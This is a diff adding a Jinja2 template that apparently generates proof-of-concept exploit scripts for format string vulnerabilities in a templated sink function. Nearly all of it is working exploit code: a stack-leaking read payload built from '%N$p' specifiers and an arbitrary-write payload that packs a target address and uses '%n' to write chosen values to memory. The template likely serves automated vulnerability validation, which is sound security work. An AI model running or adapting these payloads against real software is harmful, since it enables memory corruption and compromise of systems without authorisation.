@@ -1,0 +1,39 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Format string vulnerability in {{ sink_api }}{% endblock %}
+
+{% block config %}
+STACK_OFFSET = {{ stack_offset | default(6) }}
+{% endblock %}
+
+{% block payload %}
+def generate_read_payload():
+    """Generate payload to leak stack values"""
+    payload = b""
+    for i in range(STACK_OFFSET, STACK_OFFSET + 10):
+        payload += f"%{i}$p.".encode()
+    return payload
+
+def generate_write_payload(target_addr, value):
+    """Generate payload to write value to address"""
+    addr_bytes = struct.pack('<I', target_addr)
+    payload = addr_bytes
+    payload += f"%{value - len(addr_bytes)}c%{STACK_OFFSET}$n".encode()
+    return payload
+
+# Read payload (safe)
+payload = generate_read_payload()
+{% endblock %}
+
+{% block exploit_doc %}Execute format string exploit{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+        print(f"[*] Stack offset: {STACK_OFFSET}")
+        print(f"[*] Payload: {payload[:50]}...")
+
+        print("[*] Triggering format string (read mode)...")
+        args = arg_builder.build(payload, payload_arg_idx={{ tainted_arg | default(0) }})
+        result = func(*args)
+        print(f"[+] Completed: {result}")
+{% endblock %}
